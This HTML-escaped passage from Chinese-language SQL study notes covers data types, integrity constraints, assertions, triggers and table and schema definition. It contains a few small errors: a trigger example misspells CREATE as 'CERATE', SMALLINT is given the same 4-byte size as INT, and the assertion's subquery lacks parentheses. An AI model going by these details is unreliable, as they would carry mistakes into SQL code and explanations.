          &lt;td style=&#34;text-align: center&#34;&gt;最大长度为n的&lt;strong&gt;变长&lt;/strong&gt;字符型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;NUMBER(n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;长度为n的数字型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;INT&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;长整型(4B)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;SMALLINT&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;短整型(4B)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;BIGINT&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;大整型(8B)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;FLOAT(n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;精度至少为n位的浮点数&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;DATE&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;日期，格式为&lt;strong&gt;YYYY-MM-DD&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;TIME&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;时间，格式为&lt;strong&gt;HH:MM:SS&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;列级完整性约束条件&#34;&gt;列级完整性约束条件
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;约束条件&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;意义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;PRIMARY KEY&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;主码（元素唯一不能重复）：当&lt;strong&gt;只有一个主码&lt;/strong&gt;时，可直接在对应的属性列标注&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;NOT NULL&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;非空：表示该属性列不能取空值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;UNIQUE&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;唯一值：表示该属性列只能取唯一值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;CHECK&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;检查：检查该列是否满足某个条件，比如CHECK(某属性&amp;gt;20)&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;表级完整性约束条件&#34;&gt;表级完整性约束条件
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;约束条件&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;意义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;PRIMARY KEY(列名1,&amp;hellip;,列名n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;多个主码：当&lt;strong&gt;主码由多个属性构成&lt;/strong&gt;时，&lt;br /&gt;必须作为表级完整性定义&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;FOREIGN KEY(列名1) REFERENCES 被参照表(列名1)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;外码：被参照的列必须是 &lt;strong&gt;PRIMARY KEY&lt;/strong&gt; &lt;br /&gt;或 &lt;strong&gt;UNIQUE 约束&lt;/strong&gt; 的列，&lt;br /&gt;本表所有值来&lt;strong&gt;源于被参照的列&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;特殊完整性约束条件断言&#34;&gt;特殊完整性约束条件——断言
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;相较于列级的CHECK语句，断言能指定更一般的约束&lt;/strong&gt;&lt;/SPAN&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建断言&#34;&gt;创建断言
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE ASSERTION 断言名 CHECK字句;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.限制A课程最多60人选修：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ASSERTION&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ASSE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;CHECK&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            					     &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;NUM&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;NUM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#c678dd&#34;&gt;CLASS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;);  &lt;span style=&#34;color:#7f848e&#34;&gt;-- 此处具体操作原理往后看
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;删除断言&#34;&gt;删除断言
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP ASSERTION 断言名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;特殊完整性约束条件触发器&#34;&gt;特殊完整性约束条件——触发器
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;触发器是用户定义在关系表上的一类由事件驱动的特殊过程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表的拥有者才能在表上创建触发器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发器只能定义在基本表上，不能定义在视图上&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;定义触发器&#34;&gt;定义触发器
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE TRIGGER 触发器名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;{BEFORE|AFTER} 触发事件 ON 表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;REFERENCING NEW|OLD ROW AS 变量&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;FOR EACH {ROW|STATEMENT}&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;[WHEN 触发条件]触发动作体&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发事件&lt;/strong&gt;：INSERT DELETE UPDATE 或者他们的组合&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	 还可以UPDATE OF&amp;lt;触发列1,...&amp;gt;，即进一步指明修改哪些列时激活触发器
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;BEFORE/AFTER&lt;/strong&gt;：触发时机，表示在触发事件的操作执行之前激活触发器&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ROW/STATEMENT&lt;/strong&gt;：指明是行级/语句级触发器，行级有多少行就触发多少次，语句级只触发一次&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发条件&lt;/strong&gt;：只有触发条件为真时才执行动作体，省略WHEN则立即执行动作体&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发动作体&lt;/strong&gt;：行级可以使用NEW/OLD引用事件之后的新值和事件之前的旧值，语句级不行&lt;/p&gt;
&lt;p&gt;eg.对TAB1的Grade属性修改时，若增加了10%，则将操作记录在TAB2(Name,OldGrade,NewGrade)中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;CERATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TRIGGER&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1_T&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AFTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OF&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCING&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;OLD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;NEW&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FOR&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EACH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ROW&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHEN&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;OldGrade&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NewGrade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果触发器内有多个语句，要定义新的定界符（不常用的），并使用BEGIN和END包裹：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 1. 将定界符从 ; 改为 //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELIMITER&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;//&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 2. 定义包含多条语句的触发器
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TRIGGER&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1_T&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AFTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OF&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCING&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;OLD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;NEW&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FOR&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EACH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ROW&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;BEGIN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#7f848e&#34;&gt;-- 检查条件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;IF&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;) &lt;span style=&#34;color:#c678dd&#34;&gt;THEN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#7f848e&#34;&gt;-- 这是块内的第一条语句，用 ; 结尾
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;OldGrade&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;NewGrade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IF&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- IF语句也需要用 ; 结尾
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 3. 使用新的定界符 // 来结束整个 CREATE TRIGGER 命令
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;//&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 4. 将定界符改回默认的 ;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELIMITER&lt;/span&gt; ;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;激活触发器&#34;&gt;激活触发器
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;多个触发器执行顺序：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;执行BEFORE触发器 -&amp;gt; 激活触发器的SQL语句 -&amp;gt; 执行AFTER触发器&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;删除触发器&#34;&gt;删除触发器
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP TRIGGER 触发器名 ON 表名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;定义基本表&#34;&gt;定义基本表
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE TABLE 表名&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;(列名1 数据类型 列级完整性约束条件,&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;列名n 数据类型 列级完整性约束条件,&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;表级完整性约束条件1,&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;表级完整性约束条件n&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;);&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;VARCHAR&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;NUMBER&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;INT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;),     &lt;span style=&#34;color:#7f848e&#34;&gt;-- 多个主码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FOREIGN&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;) &lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCES&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;在模式中定义表&#34;&gt;在模式中定义表
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;一个模式包含很多基本表，有三种方式在模式里面定义基本表&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建表的时候指出模式&#34;&gt;创建表的时候指出模式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE TABLE 模式名.表名();&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建模式时直接定义表&#34;&gt;创建模式时直接定义表
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE SCHEMA 模式名 AUTHORIZATION 用户名 CREATE TABLE 表名();&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;事先设置所属的模式&#34;&gt;事先设置所属的模式
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SET SCHEMA &amp;lsquo;my_schema&amp;rsquo;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.&lt;/p&gt;
